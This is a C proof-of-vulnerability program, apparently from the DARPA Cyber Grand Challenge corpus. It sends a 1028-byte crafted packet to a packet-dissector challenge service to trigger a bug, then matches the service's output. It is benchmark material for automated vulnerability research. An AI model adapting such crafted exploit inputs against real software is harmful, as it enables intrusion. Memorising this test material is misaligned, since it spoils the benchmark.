#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xd9\x9a\x2e\xe3"
         "\xce\x53\xe1\xdb\xf2\x18\x13\x3e\xec\xa3\xd9\x99\x5c\x9b\xf4\x68"
         "\x22\x00\x00\x00\x1e\xfc\xee\xb3\x39\xf8\xbc\x30\x3c\x15\x98\xc4"
         "\x49\x63\x56\xd8\x64\x76\xa5\xd3\x43\x19\x3e\x59\xd6\xc8\xcb\xbf"
         "\x55\x8f\x90\x52\xe6\xb6\x6d\x04\x75\xd0\x22\xfe\x94\x75\x76\x82"
         "\x46\x1f\x79\x85\x4b\x85\x29\xa6\x5a\x8b\xf6\xa2\x35\x74\x72\xe7"
         "\x83\x8f\x58\x48\x3f\xeb\x8d\x21\x44\x44\xb8\xf9\x80\x5e\x57\x1e"
         "\xa8\x51\xf1\x48\xd4\xfd\x1a\x23\xe0\xbe\x8a\xf4\x09\xee\x19\xf2"
         "\xdc\x17\x62\x84\x7f\xb8\x53\xc1\xeb\x09\x0e\x70\x0c\x10\x75\x6c"
         "\xb2\xdc\xe2\x9c\x73\x6d\xa3\x42\x1d\x62\x58\x78\xcd\x92\x69\xbe"
         "\xb1\x62\x9c\x55\x3e\xdf\xff\x85\x20\x88\x9a\x43\xb2\x81\x90\xf0"
         "\x01\xf9\x37\x4f\x40\xde\xa4\x04\xaa\x79\x5d\xc1\xab\x39\x53\xd0"
         "\x9a\xcc\x42\xef\x87\xa3\xec\x61\xc5\xc0\x09\x67\x1d\x4f\x84\x4a"
         "\x44\x20\x3d\xe3\x93\x72\xc6\x7b\xd7\xee\x67\xd0\x4f\x33\x2e\x63"
         "\xb4\x60\xd4\xf3\x35\xbf\x0e\x49\xd3\x09\x7d\x01\x18\x8a\x19\x1a"
         "\xf6\xdd\x5f\xce\x33\x93\xd1\x42\x68\xa2\xf4\x4d\xde\x7b\xc0\x4f"
         "\xf0\xf6\x20\xf9\xa4\x02\x5f\x6d\x58\x05\x83\x71\x7f\x7a\x91\x5b"
         "\x12\x35\x2a\xdb\x6d\xef\x92\x63\x0c\xb1\xd8\xcf\x44\x1f\xfe\x01"
         "\xe4\xeb\x17\xde\x20\xc5\xe0\x13\x17\x5e\x13\x65\x47\x59\xa2\x03"
         "\x3f\x31\xad\x78\x6c\x95\xd0\x25\xe4\x7d\xde\xe1\x4b\xb0\xbd\x1d"
         "\x21\x69\xd1\x50\x15\xe8\x5a\x35\x3c\x31\x00\x31\x00\x15\xbc\x34"
         "\x5f\xcd\xd1\x6d\x1b\x31\x00\x9b\x81\xe1\xaa\x75\xb1\x30\x33\x60"
         "\xe2\xc5\x09\x16\xdd\x4f\xa1\xcd\x82\x0d\xd3\x58\x06\xe1\xd2\xce"
         "\x88\x84\xdc\xf1\xcf\x93\x4e\x86\x10\x35\xa9\x6a\xff\x5d\xfc\xd3"
         "\x67\x67\xda\x63\x65\xfd\x32\xa8\xb0\xe8\x9f\x6c\x82\x91\xcb\xf4"
         "\xf4\x55\x7e\x26\xea\xa5\xd8\x8a\xe4\x2b\x79\x78\x69\x03\x94\x2f"
         "\x6f\x12\xdb\x3e\x75\xff\x39\x28\x6e\x15\xc8\x8f\xe5\xd3\xb1\xb8"
         "\xa8\x17\x09\xba\xd5\xfb\xa9\x4a\x7e\x8b\xd2\x9a\x0d\x48\x3f\x12"
         "\x64\x9a\x0d\x7e\xf4\xa6\xe4\x66\xb0\xfd\x60\x18\x41\xf7\x25\xf9"
         "\xb6\x36\x87\x5a\x13\x08\xa5\x98\xb1\x59\x1e\xc5\xf5\xd4\x19\x5d"
         "\xab\xb8\x94\x85\xfc\xa8\xdf\x45\xa6\xbc\x93\xe5\x6a\x9b\x31\x61"
         "\x9e\xe0\xa4\x18\x27\x66\xe3\x66\x95\x8b\xef\x11\xe3\xda\x61\x4a"
         "\x67\x0e\x32\xbf\x68\x57\xf7\x47\x47\xcd\x7a\x2f\x3a\x7c\x80\x56"
         "\xf4\xc7\x9f\x7e\x6e\x36\xdb\x13\xbe\xcd\xc6\x8a\x7e\xd5\xb7\xc7"
         "\x98\x3b\x0e\xb7\x7f\x22\x31\xf6\x49\x15\xeb\x9c\x58\x7d\xd5\xb8"
         "\xa0\x91\xf4\x45\x34\x62\x40\xad\x62\x1f\xcc\xae\xf3\xbc\x59\x8f"
         "\xc0\x42\x39\x5e\xd8\xeb\xa8\x49\x03\x5a\x4d\xe6\xb7\x08\xf2\x30"
         "\x71\x7e\x2f\x9f\xd8\xc5\x71\xbc\x7d\xfb\xe8\x18\xa7\x3e\xb4\x0c"
         "\xf9\xc3\xb5\xb3\x42\x47\xdf\x3f\x73\x01\x43\x9a\xf9\x81\xc3\x7d"
         "\x61\x14\x5e\xa7\x9a\xd1\xdb\x3b\xfb\x85\x0b\xd5\x32\xd6\x86\xc8"
         "\x25\x55\xd4\xef\x91\xa6\x86\x3d\xd2\x2b\x76\x59\xc0\xff\x52\x5b"
         "\x77\xa1\x2a\x9b\x50\x0a\xfb\x7e\x59\x11\xfd\x8b\x08\xd2\xd3\xcd"
         "\x9b\xa1\xb5\x14\x20\x72\x54\x4e\xd7\x2e\x57\x9e\xb5\x47\xb9\x51"
         "\x0b\x1f\x64\x5d\x0a\x2b\x39\x5c\x62\xf4\xf5\x94\x5c\x98\xcb\xf0"
         "\xc8\x0a\xc8\xa2\x6b\xdb\xbe\x9e\xb8\x06\x27\x08\x75\xc4\xe8\x38"
         "\xfd\x1d\xc2\x15\x26\x93\xbb\x08\xb3\x09\x83\x36\xc3\x43\x77\x89"
         "\xa3\x96\x4b\xcc\x9a\x1e\x85\xda\xd6\xef\xfa\x83\xcf\xe4\x10\xd4"
         "\xfc\x65\xd9\x7a\x6f\xa7\x8e\x37\x09\xab\x12\x4a\x75\xf5\x2c\x14"
         "\x46\xdc\x9e\xe6\x87\xc1\x69\x0d\x85\x5b\x1b\x77\x62\x03\xdc\x20"
         "\x94\x1d\x3a\xcd\xa4\xdd\xe4\x4e\x33\x75\x02\x31\x8b\x4a\x98\x26"
         "\x29\xac\xfa\x15\x65\x45\x84\x59\xca\xc9\x50\x5b\x85\xa8\x64\x93"
         "\xc4\x06\x88\xf8\xaa\xb1\x4a\x90\x7e\x85\x0c\x39\x3f\x2a\xcd\x9c"
         "\x31\xc6\xf7\xb6\x08\xa5\x82\xcf\x46\xd4\xcb\xa8\x5e\xff\xee\xe5"
         "\xd4\xba\xc9\xbc\x41\x13\xf1\x86\xdc\x60\x54\x58\xc8\x82\x5a\x48"
         "\x43\x45\x4a\x36\xf8\x64\xf2\xdc\x9a\x88\x6c\xa8\x6f\x8a\x9a\xc9"
         "\x47\x1a\x66\xd4\x2c\x3f\x28\x84\x32\x33\xef\xeb\x5f\x7e\xcc\x91"
         "\x6d\x31\x82\x04\x61\x95\xce\x21\x9b\x27\x73\x08\x50\x27\x64\xcc"
         "\x2a\x1e\xed\xd0\x2e\xcc\x8b\x69\x55\x4e\x80\x69\xef\x96\x91\x89"
         "\x53\x49\x40\x1a\x97\x3c\x0c\x3f\x83\xea\xd1\x37\xdd\x84\xe6\x65"
         "\xd8\x69\x5d\x0f\x43\x14\x25\xfb\xdc\x99\x58\xe6\x35\xe3\x58\x21"
         "\x9e\xbe\xd4\x14\x1a\x4d\x26\xf1\x44\x67\x31\x25\x6b\x20\x03\xfe"
         "\xd0\x2c\xe0\x03\x0c\xe3\x31\xd0\x38\x04\x04\xf1\xa9\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===paleobotanyworkpeople
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x70\x61\x6c\x65\x6f\x62\x6f\x74\x61\x6e\x79"
         "\x77\x6f\x72\x6b\x70\x65\x6f\x70\x6c\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
